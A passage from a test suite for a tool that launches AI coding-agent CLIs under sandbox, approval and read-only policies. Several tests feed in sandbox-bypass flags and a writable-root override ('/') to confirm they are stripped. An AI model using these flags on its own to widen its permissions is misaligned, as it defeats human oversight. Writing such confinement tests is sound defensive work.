    const prepared = { HOME: home, PATH: '/usr/bin:/bin', SHELL: '/bin/zsh', BASH_ENV: '/finite/original.bash', ZDOTDIR: '/finite/original-zdot' };
    const heavy = heavyCommandShellEnvironment(prepared, path.join(process.cwd(), 'resources/heavy-command/preload.cjs'), token);
    setAgentSpawnHook(() => ({ authorityToken: token, env: { ...heavy, NEXUS_GATE_TOKEN: token,
      NEXUS_HEAVY_COMMAND_URL: 'http://127.0.0.1:1/hook/heavy-command', GROK_SHELL: '/opt/homebrew/bin/bash' }, extraArgs: [], processHome: home, sandboxDir: runtime }));
    const base = lane === 'user' ? trustedSpawn(fs.realpathSync(cwd)) : revisionBoundWorker(fs.realpathSync(cwd));
    const authority = lane === 'read-only' ? { ...base, context: { ...base.context!, readOnly: true, nativeReadOnly: true } } : base;
    const grok = { ...makeAdapter({ static: { GROK_SHELL: '/caller/custom-bash', SHELL: '/bin/zsh' }, passthrough: [], ephemeralHome: false }), id: 'grok', control: builtinCliPtyAdapter('grok').control };
    let sid: string | undefined; const owner = fakeWc();
    try {
      ({ sessionId: sid } = spawnAgentSession(owner, { kind: 'cli-agent', paneId: `grok-shell-${lane}`, cols: 80, rows: 24 }, grok, {}, authority));
      const spec = h.specFor(sid); expect(spec.env.GROK_SHELL).toBe('/bin/bash');
      expect(spec.env.SHELL).toBe('/bin/zsh'); expect(spec.env.NEXUS_HEAVY_ORIG_BASH_ENV).toBe('/finite/original.bash');
      expect(spec.env.NEXUS_HEAVY_ORIG_ZDOTDIR).toBe('/finite/original-zdot');
      // Grok uses its own native read-only sandbox; it has no advisory Seatbelt lane.
      if (lane === 'read-only') expect(spec.args).toEqual(expect.arrayContaining(['--permission-mode', 'plan', '--sandbox', 'read-only']));
    } finally { if (sid) killSession(owner, sid); setAgentSpawnHook(null); cleanupHeavyZshProfile(token); vi.unstubAllEnvs(); fs.rmSync(root, { recursive: true, force: true }); }
  });

  it.runIf(process.platform === 'darwin').each(['other-adapter', 'no-heavy'] as const)('F-1101: final host does not pin Grok shell outside the scoped lane (%s)', lane => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nexus-grok-shell-negative-')), home = path.join(root, 'home'); fs.mkdirSync(home);
    vi.stubEnv('HOME', home); vi.stubEnv('USERPROFILE', home);
    const h = fakeHost(); setPtyHost(h.host); const owner = fakeWc(), token = `finite-grok-${lane}`;
    const heavy = heavyCommandShellEnvironment({ HOME: home }, path.join(process.cwd(), 'resources/heavy-command/preload.cjs'), token);
    setAgentSpawnHook(() => ({ authorityToken: token, env: { ...(lane === 'other-adapter' ? { ...heavy, NEXUS_GATE_TOKEN: token, NEXUS_HEAVY_COMMAND_URL: 'http://127.0.0.1:1/hook/heavy-command' } : {}), GROK_SHELL: '/finite/custom-bash' }, extraArgs: [] }));
    // An executable named grok does not identify an adapter to the Main.
    const adapter = { ...makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }), id: lane === 'no-heavy' ? 'grok' : 'test-cli', bin: 'grok' };
    let sid: string | undefined;
    try {
      ({ sessionId: sid } = spawnAgentSession(owner, { kind: 'cli-agent', cols: 80, rows: 24 }, adapter, {}, trustedSpawn()));
      expect(h.specFor(sid).env.GROK_SHELL).toBe('/finite/custom-bash');
    } finally { if (sid) killSession(owner, sid); setAgentSpawnHook(null); cleanupHeavyZshProfile(token); vi.unstubAllEnvs(); fs.rmSync(root, { recursive: true, force: true }); }
  });

  it("deletes decoration envRemove keys from the spawned child env (F-576)", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    vi.stubEnv("NEXUS_TEST_REMOVE_ME", "inherited");
    setAgentSpawnHook(() => ({
      authorityToken: "envremove-test",
      env: { NEXUS_TEST_KEEP_ME: "1" },
      envRemove: ["NEXUS_TEST_REMOVE_ME"],
      extraArgs: [],
    }));
    const owner = fakeWc();
    try {
      const { sessionId } = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeAdapter({
          static: {},
          passthrough: ["NEXUS_TEST_REMOVE_ME"],
          ephemeralHome: false,
        }),
        {},
        trustedSpawn(),
      );
      const env = h.specFor(sessionId).env;
      // Absent — not present-but-empty: the key must not land in the child
      // env block at all (the F-576 "" poisoning kept CLAUDE_CONFIG_DIR=
      // present and sent Claude's file-backed credential store cwd-relative).
      expect(env.NEXUS_TEST_REMOVE_ME).toBeUndefined();
      expect("NEXUS_TEST_REMOVE_ME" in env).toBe(false);
      expect(env.NEXUS_TEST_KEEP_ME).toBe("1");
      killSession(owner, sessionId);
    } finally {
      setAgentSpawnHook(null);
      vi.unstubAllEnvs();
    }
  });

  it.runIf(process.platform !== "linux")(
    "lets direct panes follow writable provider policy and keeps workers writable",
    () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const codex = makeCodexAdapter();
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    let cleanupHook: (() => void) | null = null;
    try {
      const direct = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {},
        trustedSpawn(),
      );
      cleanupHook = installGovernedCodexTestHook(root);
      const worker = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {},
        revisionBoundWorker(),
      );

      expect(h.specFor(direct.sessionId).args).toEqual(
        expect.arrayContaining([
          "--sandbox",
          "workspace-write",
          "--ask-for-approval",
          "on-request",
        ]),
      );
      const workerSpec = h.specFor(worker.sessionId);
      const workerArgs = governedCodexArgv(workerSpec);
      if (process.platform === "darwin") {
        expectDarwinCodexOuterSandbox(workerSpec);
      } else {
        expect(workerArgs).toEqual(
          expect.arrayContaining(["--ask-for-approval", "never"]),
        );
        expect(workerArgs).not.toContain("--sandbox");
      }
      expect(workerArgs).not.toContain("read-only");
      expect(governedCodexPermissionProfile(workerSpec)).toBe(
        "nexus_governed_workspace",
      );
    } finally {
      cleanupHook?.();
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );

  it("rejects missing and same-root worker scopes before the PTY host", () => {
    for (const authority of [
      {
        ...revisionBoundWorker(),
        coordinationScope: undefined,
      },
      (() => {
        const worker = revisionBoundWorker();
        return {
          ...worker,
          coordinationScope: worker.scope,
        };
      })(),
    ]) {
      const h = fakeHost();
      const spawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);

      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          authority,
        ),
        // Desde a inversão de 06/08 o guard de worktree só vale no modo
        // concorrente opt-in, então o caso same-root passa a ser barrado pela
        // camada de confinamento governado do Codex. Continua FECHADO — só
        // muda quem fecha.
      ).toThrow(
        /coordination scope|physically distinct|workspace-write requires/i,
      );
      expect(spawn).not.toHaveBeenCalled();
    }
  });

  it("rejects a confined Codex executable override before the PTY host", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    adapterTrust.rejectedBinPath = "/mock/bin/codex-override";
    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          { binPath: "/mock/bin/codex-override" },
          revisionBoundWorker(),
        ),
      ).toThrow(/diverges from canonical discovery/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      adapterTrust.rejectedBinPath = null;
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")(
    "fails closed before the PTY host when Main cannot verify its sandbox helper",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-codex-profile-"),
      );
      const cleanupHook = installGovernedCodexTestHook(root);
      const h = fakeHost();
      const spawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);
      const baseline = darwinSupervisorTrust.resolutionCount;
      darwinSupervisorTrust.error = new Error(
        "Packaged Darwin PTY responsibility supervisor failed verification",
      );
      try {
        expect(() =>
          spawnAgentSession(
            fakeWc(),
            { kind: "cli-agent", cols: 80, rows: 24 },
            makeCodexAdapter(),
            {},
            revisionBoundWorker(),
          ),
        ).toThrow(/supervisor failed verification/i);
        expect(darwinSupervisorTrust.resolutionCount).toBe(baseline + 1);
        expect(spawn).not.toHaveBeenCalled();
      } finally {
        darwinSupervisorTrust.error = null;
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it.runIf(process.platform !== "linux")(
    "revalidates the sealed native chain at the last boundary before every governed host spawn",
    async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const h = fakeHost();
    const hostSpawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    const qualificationBaseline = nativeLaunchTrust.qualificationCount;
    const revalidationBaseline = nativeLaunchTrust.revalidationCount;
    let firstSessionId: string | null = null;

    try {
      const first = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeCodexAdapter(),
        {},
        revisionBoundWorker(),
      );
      firstSessionId = first.sessionId;
      expect(hostSpawn).toHaveBeenCalledOnce();
      expect(nativeLaunchTrust.qualificationCount).toBe(
        qualificationBaseline + 1,
      );
      expect(nativeLaunchTrust.revalidationCount).toBe(
        revalidationBaseline + 1,
      );
      await expect(orchTerminateSession(first.sessionId)).resolves.toBe(true);
      firstSessionId = null;

      nativeLaunchTrust.swapAfterQualification = true;
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          makeCodexAdapter(),
          {},
          revisionBoundWorker(),
        ),
      ).toThrow(/changed after qualification/i);
      expect(nativeLaunchTrust.qualificationCount).toBe(
        qualificationBaseline + 2,
      );
      expect(nativeLaunchTrust.revalidationCount).toBe(
        revalidationBaseline + 2,
      );
      expect(hostSpawn).toHaveBeenCalledOnce();
    } finally {
      nativeLaunchTrust.currentIdentity = "vendor-native-v1";
      nativeLaunchTrust.swapAfterQualification = false;
      if (firstSessionId) {
        await orchTerminateSession(firstSessionId);
      }
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );

  it.runIf(process.platform !== "linux")(
    "preserves exact Codex resume and opens fresh when latest-only was requested",
    () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const providerSessionId = "019d1000-0000-7000-8000-000000000001";
    seedCodexResumeState(root, providerSessionId);
    const h = fakeHost();
    const spawn = vi.spyOn(h.host, "spawn");
    setPtyHost(h.host);
    const codex = {
      ...makeCodexAdapter(),
      spawn: {
        ...makeCodexAdapter().spawn,
        resumeArgs: ["resume", "--last"],
        resumeIdArgs: ["resume"],
      },
    };
    setResumeSessionLookup(() => providerSessionId);
    try {
      const exact = spawnAgentSession(
        fakeWc(),
        {
          kind: "cli-agent",
          paneId: "pane-codex-resume",
          resume: true,
          resumeLatestOnly: false,
          cols: 80,
          rows: 24,
        },
        codex,
        {},
        revisionBoundWorker(),
      );
      expect(h.specFor(exact.sessionId).args).toEqual(
        expect.arrayContaining(["resume", providerSessionId]),
      );
      expect(h.specFor(exact.sessionId).args).not.toContain("--last");
      const resumeSpec = h.specFor(exact.sessionId);
      const resumeConfig = parse(
        fs.readFileSync(
          path.join(resumeSpec.env.CODEX_HOME!, "config.toml"),
          "utf8",
        ),
      ) as {
        default_permissions?: string;
        features?: { network_proxy?: boolean };
        permissions?: Record<
          string,
          { network?: { enabled?: boolean; mode?: string } }
        >;
        tui?: { resume_cwd?: string };
      };
      expect(resumeConfig.default_permissions).toBe(
        CODEX_WORKSPACE_PERMISSION_PROFILE,
      );
      expect(
        resumeConfig.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
          ?.network?.enabled,
      ).toBe(false);
      expect(
        resumeConfig.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
          ?.network?.mode,
      ).toBeUndefined();
      expect(resumeConfig.features?.network_proxy).toBe(false);
      expect(resumeConfig.tui?.resume_cwd).toBe("current");

      const fresh = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", paneId: "pane-codex-latest", resume: true, resumeLatestOnly: true, cols: 80, rows: 24 },
        codex, {}, revisionBoundWorker(),
      );
      expect(fresh.resumeMode).toBe("fresh-context");
      expect(h.specFor(fresh.sessionId).args).not.toContain("--last");
      expect(h.specFor(fresh.sessionId).args).not.toContain("resume");
      expect(spawn).toHaveBeenCalledTimes(2);
      orchKillSession(exact.sessionId);
      orchKillSession(fresh.sessionId);
    } finally {
      setResumeSessionLookup(null);
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );

  it.each(["opencode"])(
    "refuses an isolated autonomous %s worker before a process is spawned",
    (adapterId) => {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-sandbox-"));
      const worktree = path.join(root, "worker");
      fs.mkdirSync(worktree);
      try {
        const coordination = trustedSpawn(fs.realpathSync(root)).scope;
        const execution = trustedSpawn(fs.realpathSync(worktree)).scope;
        const authority: BoundSpawnAuthority = {
          source: "pending",
          cwd: execution.rootRealPath,
          scope: execution,
          coordinationScope: coordination,
          context: {
            missionId: "mission-isolated",
            contextRevision: "revision-isolated",
            role: "worker",
            workerIncarnationId: "worker-isolated",
            allowedTools: [],
            allowedSkills: null,
            scope: coordination,
            executionScope: execution,
          },
        };
        const adapter = builtinCliPtyAdapter(adapterId);
        const h = fakeHost();
        const spawn = vi.spyOn(h.host, "spawn");
        setPtyHost(h.host);

        expect(() =>
          spawnAgentSession(
            fakeWc(),
            { kind: "cli-agent", cols: 80, rows: 24 },
            adapter,
            { extraArgs: adapter.control?.permission?.yolo ?? [] },
            authority,
          ),
        ).toThrow(/workspace-write confinement/i);
        expect(spawn).not.toHaveBeenCalled();
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("F-525: governed kimi writer spawns via task-worktree boundary (worktree+merge) instead of failing closed", () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-sandbox-"));
    const worktree = path.join(root, "worker");
    fs.mkdirSync(worktree);
    try {
      const coordination = trustedSpawn(fs.realpathSync(root)).scope;
      const execution = trustedSpawn(fs.realpathSync(worktree)).scope;
      const authority: BoundSpawnAuthority = {
        source: "pending",
        cwd: execution.rootRealPath,
        scope: execution,
        coordinationScope: coordination,
        context: {
          missionId: "mission-isolated",
          contextRevision: "revision-isolated",
          role: "worker",
          workerIncarnationId: "worker-isolated",
          allowedTools: [],
          allowedSkills: null,
          scope: coordination,
          executionScope: execution,
        },
      };
      const adapter = builtinCliPtyAdapter("kimi");
      const h = fakeHost();
      const spawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);

      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          adapter,
          { extraArgs: adapter.control?.permission?.yolo ?? [] },
          authority,
        ),
      ).not.toThrow();
      expect(spawn).toHaveBeenCalledTimes(1);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.each([
    ["kimi", "--auto"],
    ["agy", "--dangerously-skip-permissions"],
    ["codex", "--dangerously-bypass-approvals-and-sandbox"],
  ])(
    "runs an isolated autopilot %s worker without an outer sandbox and keeps web/auto approval",
    (adapterId, expectedApprovalArg) => {
      setSquadCliPolicyLookupForTests(() => "operator-choice");
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-auto-"));
      const worktree = path.join(root, "worker");
      fs.mkdirSync(worktree);
      try {
        const coordination = trustedSpawn(fs.realpathSync(root)).scope;
        const execution = trustedSpawn(fs.realpathSync(worktree)).scope;
        const authority: BoundSpawnAuthority = {
          source: "pending",
          cwd: execution.rootRealPath,
          scope: execution,
          coordinationScope: coordination,
          context: {
            missionId: "mission-autopilot",
            contextRevision: "revision-autopilot",
            role: "worker",
            workerIncarnationId: `worker-${adapterId}`,
            allowedTools: [],
            allowedSkills: null,
            scope: coordination,
            executionScope: execution,
          },
        };
        const adapter =
          adapterId === "codex"
            ? makeCodexAdapter()
            : builtinCliPtyAdapter(adapterId);
        const h = fakeHost();
        setPtyHost(h.host);

        const spawned = spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          adapter,
          adapterId === 'agy' ? { keyEnv: { GEMINI_CLI_HOME: completedAgyFixtureHome(root) } } : {},
          authority,
        );
        const spec = h.specFor(spawned.sessionId);
        expect(spec.file).toBe(`/mock/bin/${adapter.bin}`);
        expect(spec.args).toContain(expectedApprovalArg);
        expect(spec.args).not.toContain("/usr/bin/sandbox-exec");
        if (adapterId === "codex") {
          expect(spec.args).toContain("--search");
          expect(spec.env.CODEX_HOME).toBeUndefined();
        }
        orchKillSession(spawned.sessionId);
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("records the native authority actually applied to an autopilot orchestrator", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const h = fakeHost();
    setPtyHost(h.host);
    const base = trustedSpawn();
    const authority: BoundSpawnAuthority = {
      ...base,
      source: "pending",
      coordinationScope: base.scope,
      context: {
        missionId: "mission-autopilot-orchestrator",
        contextRevision: "revision-autopilot-orchestrator",
        role: "orchestrator",
        readOnly: false,
        nativeReadOnly: false,
        allowedTools: ["nexus_pane_spawn"],
        allowedSkills: null,
        scope: base.scope,
        executionScope: base.scope,
      },
    };

    const spawned = spawnMainOwnedAgentSession(
      {
        kind: "cli-agent",
        cols: 80,
        rows: 24,
        paneId: "pane-autopilot-orchestrator",
        adapterId: "test-cli",
      },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );

    expect(getAgentSessionInfo(spawned.sessionId)).toMatchObject({
      role: "orchestrator",
      missionId: "mission-autopilot-orchestrator",
      readOnly: false,
      nativeReadOnly: false,
    });
    orchKillSession(spawned.sessionId);
  });

  it("deixa o worker do caminho SIMPLES rodar no próprio workspace", () => {
    // Inversão 06/08: o caminho padrão não exige worktree distinta. O worker
    // roda no workspace com cwd herdado, como no Overclock. Era este guard que
    // devolvia "autopilot mission worker requires a physically distinct
    // execution worktree" e impedia a missão de começar — inclusive para um
    // REVISOR read-only, que não escreve nada e nunca precisou de isolamento.
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-simple-"));
    try {
      const coordination = trustedSpawn(fs.realpathSync(root)).scope;
      const adapter = builtinCliPtyAdapter("kimi");
      const h = fakeHost();
      setPtyHost(h.host);

      const spawned = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        {},
        {
          source: "pending",
          cwd: coordination.rootRealPath,
          scope: coordination,
          coordinationScope: coordination,
          context: {
            missionId: "mission-simples",
            contextRevision: "revision-simples",
            role: "worker",
            workerIncarnationId: "worker-simples",
            readOnly: true,
            nativeReadOnly: true,
            allowedTools: [],
            allowedSkills: null,
            scope: coordination,
            executionScope: coordination,
            // sem isolatedWriter => caminho simples
          },
        },
      );

      expect(spawned.sessionId).toBeTruthy();
      orchKillSession(spawned.sessionId);
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it("refuses an autopilot read-only worker in the real checkout", () => {
    setSquadCliPolicyLookupForTests(() => "operator-choice");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-review-"));
    try {
      const coordination = trustedSpawn(fs.realpathSync(root)).scope;
      const adapter = builtinCliPtyAdapter("kimi");
      const h = fakeHost();
      const spawn = vi.spyOn(h.host, "spawn");
      setPtyHost(h.host);

      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          adapter,
          {},
          {
            source: "pending",
            cwd: coordination.rootRealPath,
            scope: coordination,
            coordinationScope: coordination,
            context: {
              missionId: "mission-review",
              contextRevision: "revision-review",
              role: "worker",
              workerIncarnationId: "worker-review",
              readOnly: true,
              nativeReadOnly: true,
              allowedTools: [],
              allowedSkills: null,
              scope: coordination,
              executionScope: coordination,
              // Modo concorrente OPT-IN: aqui o isolamento é exigido.
              isolatedWriter: true,
            },
          },
        ),
      ).toThrow(/physically distinct execution worktree/i);
      expect(spawn).not.toHaveBeenCalled();
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform !== "linux")(
    "pins an isolated Codex worker to workspace-write even when settings request bypass",
    () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pty-sandbox-"));
    const worktree = path.join(root, "worker");
    fs.mkdirSync(worktree);
    const attachmentRoot = fs.mkdtempSync(
      path.join(os.tmpdir(), "nexus-pty-attachment-"),
    );
    const sealedAttachment = path.join(attachmentRoot, "seal.png");
    fs.writeFileSync(sealedAttachment, "sealed");
    fs.chmodSync(sealedAttachment, 0o400);
    const canonicalAttachmentRoot = fs.realpathSync(attachmentRoot);
    const canonicalSealedAttachment = fs.realpathSync(sealedAttachment);
    const cleanupHook = installGovernedCodexTestHook(
      root,
      canonicalSealedAttachment,
    );
    try {
      const coordination = trustedSpawn(fs.realpathSync(root)).scope;
      const execution = trustedSpawn(fs.realpathSync(worktree)).scope;
      const initialPrompt =
        "Implemente a tarefa selada e chame nexus_handoff_submit.";
      const authority: BoundSpawnAuthority = {
        source: "pending",
        cwd: execution.rootRealPath,
        scope: execution,
        coordinationScope: coordination,
        context: {
          missionId: "mission-isolated",
          contextRevision: "revision-isolated",
          role: "worker",
          workerIncarnationId: "worker-isolated",
          allowedTools: [],
          allowedSkills: null,
          initialPrompt,
          scope: coordination,
          executionScope: execution,
        },
      };
      const h = fakeHost();
      setPtyHost(h.host);
      const codex = makeCodexAdapter();
      adapterTrust.builtinIds.delete("codex");
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          codex,
          {},
          authority,
        ),
      ).toThrow(/trusted builtin/i);
      adapterTrust.builtinIds.add("codex");

      const spawned = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        {
          extraArgs: [
            "--dangerously-bypass-approvals-and-sandbox",
            "--add-dir",
            root,
            "-c",
            'sandbox_workspace_write.writable_roots=["/"]',
          ],
        },
        authority,
      );
      const spec = h.specFor(spawned.sessionId);
      const protectedAgentsPath = path.join(
        fs.realpathSync(execution.rootRealPath),
        ".agents",
      );
      const config = parse(
        fs.readFileSync(
          path.join(spec.env.CODEX_HOME!, "config.toml"),
          "utf8",
        ),
      ) as {
        permissions?: Record<
          string,
          { filesystem?: Record<string, string> }
        >;
      };

      // Darwin cannot nest Seatbelt profiles. Nexus owns the outer physical
      // boundary and Codex runs without a second inner sandbox.
      expectDarwinCodexOuterSandbox(spec);
      expect(spec.args[1]).toContain(
        `(literal "${canonicalSealedAttachment}")`,
      );
      expect(spec.args[1]).not.toContain(
        `(subpath "${canonicalAttachmentRoot}")`,
      );
      const writeSectionStart = spec.args[1].indexOf("(allow file-write*");
      const readSectionStart = spec.args[1].indexOf("(deny file-read*");
      expect(writeSectionStart).toBeGreaterThan(-1);
      expect(readSectionStart).toBeGreaterThan(writeSectionStart);
      const writeRules = spec.args[1].slice(
        writeSectionStart,
        readSectionStart,
      );
      expect(writeRules).not.toContain(canonicalSealedAttachment);
      expect(governedCodexArgv(spec)).toEqual([
        "--model",
        "gpt-6.1-sol",
        "--strict-config",
        "--disable",
        "multi_agent",
        "--sandbox",
        "danger-full-access",
        "--ask-for-approval",
        "on-request",
        initialPrompt,
      ]);
      expect(
        governedCodexArgv(spec).filter((arg) => arg === initialPrompt),
      ).toHaveLength(1);
      expect(
        config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
          ?.filesystem?.[protectedAgentsPath],
      ).toBe("deny");
      expect(spec.env.HOME).toBe(
        path.join(spec.env.CODEX_HOME!, "shell-home"),
      );
      expect(spec.env.TMPDIR).toBe(
        path.join(spec.env.CODEX_HOME!, "shell-tmp"),
      );
      expect(governedCodexArgv(spec)).not.toContain(root);
      expect(governedCodexArgv(spec)).not.toContain(
        "--dangerously-bypass-approvals-and-sandbox",
      );
      expect(governedCodexPermissionProfile(spec)).toBe(
        "nexus_governed_workspace",
      );
    } finally {
      fs.rmSync(attachmentRoot, { recursive: true, force: true });
      cleanupHook();
      adapterTrust.builtinIds.add("codex");
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );

  it.runIf(process.platform !== "linux")(
    "makes read-only override the configured Codex bypass",
    () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const codex = makeCodexAdapter();
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-codex-profile-"));
    const cleanupHook = installGovernedCodexTestHook(root);
    const worker = revisionBoundWorker();
    const reviewer: BoundSpawnAuthority = {
      ...worker,
      context: {
        ...worker.context!,
        readOnly: true,
      },
    };

    adapterTrust.builtinIds.delete("codex");
    try {
      expect(() =>
        spawnAgentSession(
          fakeWc(),
          { kind: "cli-agent", cols: 80, rows: 24 },
          codex,
          { extraArgs: ["--dangerously-bypass-approvals-and-sandbox"] },
          reviewer,
        ),
      ).toThrow(/trusted builtin/i);
    } finally {
      adapterTrust.builtinIds.add("codex");
    }

    try {
      const spawned = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        codex,
        { extraArgs: ["--dangerously-bypass-approvals-and-sandbox"] },
        reviewer,
      );

      const spec = h.specFor(spawned.sessionId);
      const args = governedCodexArgv(spec);
      if (process.platform === "darwin") {
        expectDarwinCodexOuterSandbox(spec);
      }
      expect(args).not.toContain(
        "--dangerously-bypass-approvals-and-sandbox",
      );
      expect(args).toContain(
        process.platform === "darwin" ? "on-request" : "never",
      );
      if (process.platform !== "darwin") {
        expect(args).not.toContain("--sandbox");
      }
      expect(governedCodexPermissionProfile(spec)).toBe(
        "nexus_governed_read_only",
      );
    } finally {
      cleanupHook();
      fs.rmSync(root, { recursive: true, force: true });
    }
    },
  );

  it.runIf(process.platform === "darwin")(
    "confines the exact immediate Pet maker to an offline writable workspace",
    () => {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), "nexus-pet-native-"));
      const workspace = path.join(root, "workspace");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(workspace, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const h = fakeHost();
      setPtyHost(h.host);
      const owner = fakeWc();
      let sessionId: string | null = null;

      try {
        const spawned = spawnAgentSession(
          owner,
          {
            kind: "cli-agent",
            paneId: "pane-pet-maker",
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          petStudioGrant(fs.realpathSync(workspace)),
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workspaceReal = fs.realpathSync(workspace);

        expectDarwinCodexOuterSandbox(spec);
        expect(spec.env.HOME).toBe(
          path.join(spec.env.CODEX_HOME!, "shell-home"),
        );
        expect(spec.env.TMPDIR).toBe(
          path.join(spec.env.CODEX_HOME!, "shell-tmp"),
        );
        expect(config.default_permissions).toBe(
          CODEX_WORKSPACE_PERMISSION_PROFILE,
        );
        expect(config.features?.network_proxy).toBe(false);
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]?.network,
        ).toEqual({ enabled: false });
        expect(
          config.permissions?.[CODEX_WORKSPACE_PERMISSION_PROFILE]
            ?.filesystem,
        ).toEqual(
          expect.objectContaining({
            [workspaceReal]: "write",
            [path.join(workspaceReal, ".agents")]: "deny",
            [path.join(workspaceReal, ".codex")]: "deny",
          }),
        );
        expect(getOwnedAgentSessionInfo(owner, spawned.sessionId)).toMatchObject(
          {
            source: "legacy-squad",
            role: "orchestrator",
            squadId: PET_STUDIO_SQUAD_ID,
            nativeReadOnly: false,
          },
        );
      } finally {
        if (sessionId) orchKillSession(sessionId);
        cleanupHook();
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it.runIf(process.platform === "darwin")(
    "restores an exact persisted Pet maker to the same offline workspace profile",
    () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-pet-resume-native-"),
      );
      const workspace = path.join(root, "workspace");
      const runtime = path.join(root, "runtime");
      fs.mkdirSync(workspace, { recursive: true });
      const cleanupHook = installGovernedCodexTestHook(runtime);
      const providerSessionId = "019d1000-0000-7000-8000-000000000002";
      seedCodexResumeState(runtime, providerSessionId);
      const h = fakeHost();
      setPtyHost(h.host);
      setResumeSessionLookup(() => providerSessionId);
      let sessionId: string | null = null;

      try {
        const spawned = spawnAgentSession(
          fakeWc(),
          {
            kind: "cli-agent",
            paneId: "pane-pet-resume",
            resume: true,
            resumeLatestOnly: false,
            cols: 80,
            rows: 24,
          },
          makeCodexAdapter(),
          {},
          persistedPetStudioGrant(fs.realpathSync(workspace)),
        );
        sessionId = spawned.sessionId;
        const spec = h.specFor(spawned.sessionId);
        const config = parse(
          fs.readFileSync(
            path.join(spec.env.CODEX_HOME!, "config.toml"),
            "utf8",
          ),
        ) as {
          default_permissions?: string;
          features?: { network_proxy?: boolean };
          permissions?: Record<
            string,
            {
              filesystem?: Record<string, string>;
              network?: { enabled?: boolean };
            }
          >;
        };
        const workspaceReal = fs.realpathSync(workspace);

